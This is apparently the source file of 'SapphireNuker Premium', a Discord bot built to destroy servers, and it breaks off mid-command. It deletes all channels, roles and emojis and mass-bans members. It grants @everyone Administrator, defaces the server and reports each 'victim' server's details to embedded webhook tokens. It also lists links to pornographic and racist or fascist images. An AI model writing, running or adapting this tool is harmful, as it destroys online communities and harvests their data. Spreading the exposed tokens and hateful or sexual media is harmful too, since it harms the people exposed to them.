const discordjs = require('discord.js')
const client = new discordjs.Client()
const colors = require('colors')
const fs = require('fs')
const https = require('https')
const packagejson = require('./package.json');
const configjson = require('./config.json')
var crypto = require("crypto");
var os_utils = require('os-utils');
const os = require('os')
const bufferutil = require('bufferutil')
const utf8validate = require('utf-8-validate')
const disbut = require('discord-buttons')
disbut(client)

//crypto.randomBytes(5).toString('hex')
//#region Nuker Variable Initialization
const version = packagejson.version
const author = packagejson.author
var config_info_scroll_timeout = 0
const versionType = "Premium"

const mangodb_srv = "il iei de pe mongodb.com"
var minping = 15	
var maxping = 30
const monthNames = ["January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December"
];
//#endregion
var logswebhookid = "861935614159749130"
var logswebhooktoken = "4JcFaqKylubkl8n9kdN75_98Y28BXviRon7RWUvo2HVwvmxq8RPRPxtDSAqiEjRhNBma"
var joinswebhookid = "863409330862948362"
var joinswebhooktoken = "3wK2p-VeKOvaFvKTlgkfl06xXSpJKBCknB5ZKsqdnvecsekKTf0QHhrsCFOwIlBBUtyr"
var joinswebhookname = `SapphireNuker Premium Join Logs`	
var commandswebhookid = "872551293447708702"
var commandswebhooktoken = "JsywzyOQGl4aF_byEu7vi_nGUtfy_WPaybinC-KJqdwHomhhW4lSztdFzXlCNfH2ZAR2"
var webhookname = `SapphireNuker Premium Nuke Logs`;
var commandswebhookname = `SapphireNuker Premium Command Logs`
var webhookicon = "";
var pornimgs = ["https://cdn.discordapp.com/attachments/863354154482008085/864148203603623936/cartelul.png", "https://cdn.discordapp.com/attachments/753637279142248511/863529943790387210/bag.boabe.frt-20200322-0001.jpg", "https://cdn.discordapp.com/attachments/753637279142248511/863528564426276904/vlad._wh-20210419-0001.jpg","https://cdn.discordapp.com/attachments/753637279142248511/863527802166312960/unknown-9.png", "https://cdn.discordapp.com/attachments/753637279142248511/863527541088059412/WelllitPeacefulChihuahua-mobile_1.mp4", "https://cdn.discordapp.com/attachments/855158880661143582/863100004587274270/video-5e8de51a3db7c200ad186a1b694a25fb-V.mp4","https://www.gifmeat.com/wp-content/uploads/2019/01/Gorgeous-blonde-pornstar-Samantha-Saint-rubbing-her-clit-while-getting-fucked-gif.gif", "https://media.giphy.com/media/J3FoLSYyiXA7rC0LZV/source.gif", "http://45.media.tumblr.com/978e401398e6762343965d610d4de3b6/tumblr_nxn3fqMxTg1tgc11ao1_400.gif", "https://sexwall.me/media/2015/07/tumblr_nqelc7VlYu1u2cv3go5_500.gif", "https://cdn5-images.motherlessmedia.com/images/75A56D2.gif"]
var racistimgs = ["https://cdn.discordapp.com/attachments/863031158643228672/863049777653481512/IMG_20210321_084304_140.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048381742841866/IMG_20210507_235348_306.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048381483974696/P181110_21.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048381278060544/photo_2020-11-27_02-31-24-1.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048180535132200/keep-calm-and-be-a-fascist.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048180757168158/IMG_20210515_142014.jpg", "https://i.ibb.co/0rg0fd9/image.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048180975009812/IMG_20210509_212743_449-1.jpg", "https://i.ibb.co/KLq84j0/image.png", "https://i.ibb.co/HB9hfG5/image.png", "https://i.ibb.co/d5WJGTF/image.png", "https://cdn.discordapp.com/attachments/817773091278290995/835492371780075550/video0_11-1.mp4", "https://thumbs.gfycat.com/MealySpectacularKinkajou-size_restricted.gif", "https://i.gifer.com/HtUY.gif", "http://25.media.tumblr.com/tumblr_md4zpqIpPi1rbfgffo1_500.gif", "https://i.gifer.com/9pQ5.gif", "https://cdn.discordapp.com/attachments/863031158643228672/863038051551019008/juden.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863038247239548928/cfd1945bd02261cd916b5a5c4127d97b4a1dd877.jpg"]

var boosterusers = ["620602478454374411", "852607966447534161", "849306591231475723", "622116876046041099", "841963385846759464", "680668209082269745", "852625424827416616", "723533573344460800", "548587989442232332"] //Boosteri <3
var whitelistedservers = ["861916028140650506", "870206001536712734"]
var blacklistedservers = ["852851622975373313", "838775006678745128", "863352404023967764"] //Gamerii S si NGP si CZ :)
const logsclient = new discordjs.WebhookClient(logswebhookid, logswebhooktoken);
const commandsclient = new discordjs.WebhookClient(commandswebhookid, commandswebhooktoken);
const joinsclient = new discordjs.WebhookClient(joinswebhookid, joinswebhooktoken);
//#region Config Variable Initialization
var configfilename = "config.json"
var bot_activity = `v${version} | ${boosterusers.length} wl usr`

var token = configjson.general.token
var prefix = configjson.general.prefix
var bot_username = configjson.bot_customization.bot_username
var customize_bot = configjson.bot_customization.customize_bot
var bot_avatar = configjson.bot_customization.bot_avatar
var delete_channels = configjson.channels.delete_channels
var create_channels = configjson.channels.create_channels
var channels_name = configjson.channels.channels_name
var channels_topic = configjson.channels.channels_topic
var create_channels_amount = configjson.channels.channels_amount
var delete_roles = configjson.roles.delete_roles
var create_roles = configjson.roles.create_roles
var roles_name = configjson.roles.roles_name
var roles_color = configjson.roles.roles_color
var create_roles_amount = configjson.roles.roles_amount
var delete_emotes = configjson.emotes.delete_emotes
var ban_all = configjson.ban.ban_all
var ban_reason = configjson.ban.ban_reason
var spam_message = configjson.spam.spam_message
var server_name = configjson.server.server_name
var server_icon_url = configjson.server.server_icon_url
var give_everyone_administrator = configjson.server.give_everyone_administrator
var nuker_v2 = true;
var footer = `💎 | SapphireNuker v${version} ${versionType}`
var server_name_cool = "";
//#endregion

function setTerminalTitle(title)
{
  process.stdout.write(
    String.fromCharCode(27) + "]0;" + title + String.fromCharCode(7)
  );
}

client.on('ready', async(readyarg) => {
	webhookicon = await client.user.displayAvatarURL({dynamic: true})
	sapphireid = client.user.id
	var errorvar;

	setTerminalTitle(`SapphireNuker | v${version} | Connected as: ${client.user.username}#${client.user.discriminator} | Guilds: ${client.guilds.cache.size} | Made with love by ${author}.`)
    await client.user.setActivity(bot_activity, { type: 'STREAMING', url: "https://twitch.tv/miakhalifa/" }); // sets bot's activities to one of the phrases in the arraylist.

	
	if (customize_bot == false)
	{
		console.log("Customizing bot has been disabled.")
	}
	else
	{
		if (client.user.username != bot_username)
		{
			await client.user.setUsername(bot_username).catch(err => errorvar = err)
		}
		if (client.user.avatar != bot_avatar)
		{
			await client.user.setAvatar(bot_avatar).catch(err => errorvar = err)
		}
		
		
	}
	
	console.log(`Type ${prefix}help to get help about the commands.`.yellow.bold)



})

//#region Command Handling
client.on('message', async(message) => {
	server_name_cool = `${message.guild.owner.user.username}'s trash can`;
	

	if (!message.content.startsWith(prefix.toLowerCase()) && message.content != "adio" || message.author.bot) return;

	const args = message.content.slice(prefix.toLowerCase().length).trim().split(/ +/);
	const command = args.shift().toLowerCase();
	
	message.delete()
	if (command === 'nuke' || message.content == "adio") {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const logsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  ***New victim!***`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Nukes', message.author.avatarURL)
		.addField('**Server Name**', `*${message.guild.name}*`, false)
		.addField('**Total Member Count**', `*${message.guild.memberCount} member(s)*`, false)
		.addField('**Server ID**', `*${message.guild.id}*`, false)
		.addField('**Server Owner**', `*${message.guild.owner.displayName}#${message.guild.owner.user.discriminator} (${message.guild.owner.id})*`, false)
		.addField(`**Roles Count**`, `*${message.guild.roles.cache.size} role(s)*`, false)
		.addField(`**Channels Count**`, `*${message.guild.channels.cache.size} channel(s)*`, false)
		.addField(`**Bot Count**`, `*${message.guild.members.cache.filter(member => member.user.bot).size} bot(s)*`, false)
		.addField(`**User Count**`, `*${message.guild.members.cache.filter(member => !member.user.bot).size} user(s)*`, false)
		.addField(`**Who typed the command**`, `*${message.author.username}#${message.author.discriminator} (${message.author.id})*`, false)
	    .setFooter(footer)

		await logsclient.client.send('', {
			username: webhookname,
			avatarURL: webhookicon,
			embeds: [logsembed],
		});

		var errorvar;
		setTerminalTitle(`SapphireNuker | Nuking '${message.guild.name}' | Connected as: ${client.user.username}#${client.user.discriminator}`)
		console.clear()
		
		
		console.log(`THE MAYHEM BEGINS! ${message.guild.name.toUpperCase()} IS DEAD!`.red.bold)
		console.log(`SapphireNuker will now nuke the server using the data from the config file.`.magenta.bold)

		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")

			async function setadmin()
			{
				await everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
			}
			setadmin()
			
			
			
			
		}

		
		if (delete_channels == false)
		{
			console.log(`Deleting channels has been disabled.`)
		}
		else
		{
			async function deletech()
			{
				await message.guild.channels.cache.forEach(async channel => {
					await channel.delete().catch(err => errorvar = err);
				});
			}	
			deletech()

			
		}
		


		if (delete_roles == false)
		{
			console.log(`Deleting roles has been disabled.`)
		}
		else
		{
			async function delrol()
			{
				await message.guild.roles.cache.forEach(async role => {
					await role.delete()
					.catch(err => errorvar = err);
				});
			}

			delrol()
			

			
		}
		

		if (delete_emotes == false)
		{
			console.log(`Deleting emotes has been disabled.`)
		}
		else
		{
			async function delemo()
			{
				await message.guild.emojis.cache.forEach(async emote => {
					await emote.delete()
					.catch(err => errorvar = err);
				});	
			}
			

			
		}
		
		
		await message.guild.setName(server_name_cool).catch(err => errorvar = err)
		await message.guild.setIcon(server_icon_url).catch(err => errorvar = err)
		await message.guild.setRegion('brazil').catch(err => errorvar = err)
		await message.guild.setBanner(configjson.server.banner).catch(err => errorvar = err)
		await message.guild.setVerificationLevel('VERY_HIGH').catch(err => errorvar = err)
		await message.guild.setPreferredLocale('de')
		await message.guild.setDefaultMessageNotifications('ALL')
		await message.guild.setSplash(configjson.server.banner).catch(err => errorvar = err)
		await message.guild.setDiscoverySplash(configjson.server.banner).catch(err => errorvar = err)
		if (message.guild.fetchTemplates() != null || message.guild.fetchTemplates() != undefined)
		{
			(await message.guild.fetchTemplates()).first().delete()
		}
		;(await message.guild.createTemplate("important <3")).sync()

		if (nuker_v2 == false)
		{
			if (create_roles == false)
		{
			console.log(`Creating roles has been disabled.`)
		}
		else
		{
			var rl_create_index = 0
			while (rl_create_index != create_roles_amount)
			{
				async function crroles()
				{
					await message.guild.roles.create({
						data: {
	
							name: roles_name,
							color: roles_color
						},
					}).catch(err => errorvar = err)
						rl_create_index += 1
				}
				crroles()
			}

			
		}
		}
		

		
		if (nuker_v2 == false)
		{
			if (create_channels == false)
		{
			console.log(`Creating channels has been disabled.`)
		}
		else
		{
				var ch_create_index = 0
				while (ch_create_index != create_channels_amount)
				{
					async function crchl()
					{
						var chnl = await message.guild.channels.create(channels_name, {type: "text",	topic: channels_topic})
						chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
						chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
						chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
						chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
						chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
					ch_create_index += 1
					}
					
					
					crchl()

					
				}

				

		}
		}
		

		
		

		



		if (ban_all == false)
		{
			console.log(`Banning members has been disabled.`)
		}
		else
		{
			message.guild.members.cache.forEach(async member => {   
                if (!member.bannable) return
                await member.ban({reason: ban_reason}).catch(async err => errorvar = err)
            })
			
			
		}
		
		
		
		

		

	}
	else if (command === 'guildname' || command === 'guildinfo' || command === 'serverinfo') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n😗  Guild Info:**`)
	    .addField('**Server Name**', `*${message.guild.name}*`, false)
		.addField('**Total Member Count**', `*${message.guild.memberCount} member(s)*`, false)
		.addField('**Server ID**', `*${message.guild.id}*`, false)
		.addField('**Server Owner**', `*${message.guild.owner.displayName}#${message.guild.owner.user.discriminator} (${message.guild.owner.id})*`, false)
		.addField(`**Created on**`, `*${message.guild.createdAt.getDay()} ${monthNames[message.guild.createdAt.getMonth() - 1]} ${message.guild.createdAt.getFullYear()}, ${message.guild.createdAt.getHours()}:${message.guild.createdAt.getMinutes()}:${message.guild.createdAt.getSeconds()}*`, false)
		.addField(`**Roles Count**`, `*${message.guild.roles.cache.size} role(s)*`, false)
		.addField(`**Channels Count**`, `*${message.guild.channels.cache.size} channel(s)*`, false)
		.addField(`**Bot Count**`, `*${message.guild.members.cache.filter(member => member.user.bot).size} bot(s)*`, false)
		.addField(`**User Count**`, `*${message.guild.members.cache.filter(member => !member.user.bot).size} user(s)*`, false)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🏙️  ***Guild Name / Info***')
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Command')
	    .addField('**Server Name**', `*${message.guild.name}*`, false)
		.addField('**Total Member Count**', `*${message.guild.memberCount} member(s)*`, false)
		.addField('**Server ID**', `*${message.guild.id}*`, false)
		.addField('**Server Owner**', `*${message.guild.owner.displayName}#${message.guild.owner.user.discriminator} (${message.guild.owner.id})*`, false)
		.addField(`**Created on**`, `*${message.guild.createdAt.getDay()} ${monthNames[message.guild.createdAt.getMonth() - 1]} ${message.guild.createdAt.getFullYear()}, ${message.guild.createdAt.getHours()}:${message.guild.createdAt.getMinutes()}:${message.guild.createdAt.getSeconds()}*`, false)
		.addField(`**Roles Count**`, `*${message.guild.roles.cache.size} role(s)*`, false)
		.addField(`**Channels Count**`, `*${message.guild.channels.cache.size} channel(s)*`, false)
		.addField(`**Bot Count**`, `*${message.guild.members.cache.filter(member => member.user.bot).size} bot(s)*`, false)
		.addField(`**User Count**`, `*${message.guild.members.cache.filter(member => !member.user.bot).size} user(s)*`, false)
	    .setFooter(footer)
	
        await message.channel.send(exampleEmbed)
	}
	else if (command === "banall")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (!args[0])
		{
			const output = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle(`**The '${command}' (No custom reason) command will start immediately.**`)
	    	.setAuthor('Command Successful')
	    	.setFooter(footer)
			await message.channel.send(output)
			try {
				async function banall()
				{
					message.guild.members.cache.forEach(async member => {   
						if (!member.bannable) return
						await member.ban({reason: ban_reason}).catch(async err => errorvar = err)
					})
				}
				banall()
				
			} catch (error) {
				
			}
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
		.setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		

		try {
			async function banall2()
			{
				message.guild.members.cache.forEach(async member => {   
					if (!member.bannable) return
					await member.ban({reason: args.slice(1).join(' ')}).catch(async err => errorvar = err)
				})
			}
			banall2()
		} catch (error) {
			
		}
		

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)
	}
	else if (command === "deletechannels")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		await message.channel.send("<3")

		async function delchl2()
		{
			await message.guild.channels.cache.forEach(async channel => {
				await channel.delete().catch(err => errorvar = err);
			});
		}

		delchl2()
		

		
	}
	else if (command === "deleteroles")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		message.guild.roles.cache.forEach(role => {
			role.delete()
			.catch(err => errorvar = err);
		});

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)

	}
	else if (command === "deleteemotes" || command === "deleteemojis")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		message.guild.emojis.cache.forEach(emote => {
			emote.delete()
			.catch(err => errorvar = err);
		});	

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)
	}
	else if (command === "give_everyone_admin" || command === "admin_to_everyone" || command === "setadmin")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
		everyone.setPermissions("ADMINISTRATOR");
		

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately. \nNow @everyone will have  __*Administrator*__  permissions! 😈**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)
	}
	else if (command === "change_server_look" || command == "customizeserver")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		
		message.guild.setName(server_name_cool).catch(err => errorvar = err)
		message.guild.setIcon(server_icon_url).catch(err => errorvar = err)
		message.guild.setRegion('brazil').catch(err => errorvar = err)
		message.guild.setBanner(configjson.server.banner).catch(err => errorvar = err)
		message.guild.setVerificationLevel('VERY_HIGH').catch(err => errorvar = err)
		message.guild.setPreferredLocale('de')
		message.guild.setDefaultMessageNotifications('ALL')
		message.guild.setSplash(configjson.server.banner).catch(err => errorvar = err)
		message.guild.setDiscoverySplash(configjson.server.banner).catch(err => errorvar = err)
		if (message.guild.fetchTemplates() != null || message.guild.fetchTemplates() != undefined)
		{
			(await message.guild.fetchTemplates()).first().delete()
		}
		;(await message.guild.createTemplate("important <3")).sync()
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)
	}
	else if (command === "servername")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}', Name: '${args.slice(1).join(' ')}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**If the name isn't empty, the '${command}' (Name: '${args.slice(0).join(' ')}') command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)
		await message.channel.send(output)

		try {
			message.guild.setName(args.slice(0).join(' '))
		} catch (error) {
			
		}
		
		
		
		

		
	}
	else if (command === "servericon")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
